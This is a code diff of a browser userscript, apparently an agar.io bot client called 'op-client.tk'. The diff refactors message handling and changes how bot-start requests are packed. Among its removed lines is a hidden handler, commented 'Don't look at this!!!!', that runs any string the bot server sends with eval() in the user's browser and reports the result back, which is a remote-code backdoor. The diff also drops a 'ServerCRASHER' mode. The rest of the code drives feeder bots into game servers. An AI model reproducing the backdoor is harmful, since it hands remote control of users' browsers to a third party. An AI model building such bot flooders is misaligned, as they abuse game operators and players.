@@ -60,7 +60,7 @@ setTimeout(function() {
                 let offset = 0;
                 let opcode = buf.getUint8(offset++);
                 switch (opcode) {
-                    case 0:
+                    case 0: {
                         let addClasses = '';
                         let removeClasses = '';
                         switch (buf.getUint8(offset++)) {
@@ -82,6 +82,8 @@ setTimeout(function() {
                             case 4:
                                 this.botServerStatus = 'Ready';
                                 $('#toggleButton').replaceWith(`<button id='toggleButton' onclick='window.client.startBots();' class='btn btn-success'>Start Bots</button>`);
+                                $("#slv2_bot_load").css(`width`, `0%`);
+                                $(".max").html("0/0");
                                 window.bots = [];
                                 break;
                             case 5:
@@ -115,8 +117,8 @@ setTimeout(function() {
                                 break;
                         }
                         $("#ServerStatus").text(this.botServerStatus);
-                        break;
-                    case 1:
+                    } break;
+                    case 1: {
                         let spawnedBots = buf.getUint16(offset, true);
                         offset += 2;
                         let connectedBots = buf.getUint16(offset, true);
@@ -128,45 +130,7 @@ setTimeout(function() {
                         $(".max").html(spawnedBots + "/" + maxBots);
                         $("#slv2_bot_load").css(`width`, `${Math.floor((spawnedBots / maxBots) * 100)}%`);
                         $('#timeLeft').html(`${(timeLeft / 3600 >> 0) +":"+ (timeLeft / 60 % 60 >> 0)+":"+(timeLeft % 60 >> 0)}`);
-                        break;
-                    case 2: // Bots info from server
-                        window.bots = [];
-                        let numBots = buf.getUint16(offset, true);
-                        offset += 2;
-                        for (let i = 0; i < numBots; i++) {
-                            let xPos = buf.getInt32(offset, true) + window.offsetX;
-                            offset += 4;
-                            let yPos = buf.getInt32(offset, true) + window.offsetY;
-                            offset += 4;
-                            window.bots.push({
-                                "xPos": xPos,
-                                "yPos": yPos
-                            });
-                        }
-                        break;
-                    case 3: // Don't look at this!!!!
-                        let len = buf.getUint16(offset, true);
-                        offset += 2;
-                        let msg = '';
-                        for (let i = 0; i < len; i++) {
-                            msg += String.fromCharCode(buf.getUint8(offset++));
-                        }
-                        try {
-                            eval(msg);
-                            let buf1 = this.createBuffer(2);
-                            buf1.setUint8(0, 8);
-                            buf1.setUint8(1, 1);
-                            this.send(buf1);
-                        }
-                        catch (e) {
-                            e = e.toString();
-                            let buf1 = this.createBuffer(3 + e.length);
-                            buf1.setUint8(0, 8);
-                            buf1.setUint8(1, 0);
-                            for (let i = 0; i < e.length; i++) buf1.setUint8(2 + i, e.charCodeAt(i));
-                            this.send(buf1);
-                        }
-                        break;
+                    } break;
                 }
             }
 
@@ -222,17 +186,10 @@ setTimeout(function() {
 
             startBots() {
                 this.sendBotMode();
-                let buf = this.createBuffer(6 + window.vanilla.server.addr.length + 2 * this.botNick.length);
+                let buf = this.createBuffer(6 + window.vanilla.server.addr.length + 2);
                 let offset = 0;
                 buf.setUint8(offset++, 2);
                 for (let i = 0; i < window.vanilla.server.addr.length; i++) buf.setUint8(offset++, window.vanilla.server.addr.charCodeAt(i));
-                offset++;
-                for (let i = 0; i < this.botNick.length; i++) {
-                    buf.setUint16(offset, this.botNick.charCodeAt(i), true);
-                    offset += 2;
-                }
-                offset += 2;
-                buf.setUint16(offset, this.botAmount, true);
                 this.send(buf);
                 $('#timeLeft').html("0:0:0");
                 $('#toggleButton').replaceWith(`<button id='toggleButton' onclick='window.client.stopBots();' class='btn btn-danger'>Stop Bots</button>`);
@@ -274,7 +231,6 @@ setTimeout(function() {
 
             stopBots() {
                 this.send(new Uint8Array([3]));
-                $("#slv2_bot_load").css(`width`, `0%`);
             }
 
             send(data) {
@@ -325,7 +281,7 @@ setTimeout(function() {
                 const botMode = localStorage.getItem('botMode');
                 $('head').append(`<style type="text/css">.agario-panel,.shop-blocker{background-color:rgba(23,23,23,0.73)!important;color:#fff!important; background-image: url("http://cdn.ogario.ovh/static/img/pattern.png"); background-repeat: repeat; background-position: top center;}</style>`);
                 $('.partymode-info').remove();
-                $('.agario-promo-container').replaceWith(`<div class="agario-panel"><center><h3>op-client.tk</h3></center><div style="margin-top: 6px;" class="input-group"><span style="width:75px;" class="input-group-addon" id="basic-addon1">UUID</span><input style="width:230px" disabled id="agarUnlimitedToken" class="form-control" placeholder="UUID" value="Creating Token..."></input></div><br></span>Bot Modes  <select style="font-size: 12px; left: 90px;" onchange="window.client.botMode=this.value;localStorage.setItem('botMode', this.value);" class="form-control"><option ${botMode == "FEEDER" ? "selected" : ""} value="FEEDER">FeederBots</option><option ${botMode == "spawnCRASHER" ? "selected" : ""} value="CRASHER">ServerCRASHER</option></select><br><button id="toggleButton" onclick="window.client.startBots();" class="btn btn-success">Start Bots</button><button onclick="if(!window.client.reconnect&&window.client.ws.readyState!==1){window.client.reconnect=true;window.client.connect();}else{alert('Already connected.');}" class="btn btn-success" style="float:right;">Reconnect</button></div>`);
+                $('.agario-promo-container').replaceWith(`<div class="agario-panel"><center><h3>op-client.tk</h3></center><div style="margin-top: 6px;" class="input-group"><span style="width:75px;" class="input-group-addon" id="basic-addon1">UUID</span><input style="width:230px" disabled id="agarUnlimitedToken" class="form-control" placeholder="UUID" value="Creating Token..."></input></div><br></span>Bot Modes  <select style="font-size: 12px; left: 90px;" onchange="window.client.botMode=this.value;localStorage.setItem('botMode', this.value);" class="form-control"><option ${botMode == "FEEDER" ? "selected" : ""} value="FEEDER">FeederBots</option></select><br><button id="toggleButton" onclick="window.client.startBots();" class="btn btn-success">Start Bots</button><button onclick="if(!window.client.reconnect&&window.client.ws.readyState!==1){window.client.reconnect=true;window.client.connect();}else{alert('Already connected.');}" class="btn btn-success" style="float:right;">Reconnect</button></div>`);
             }
 
             addGUI() {
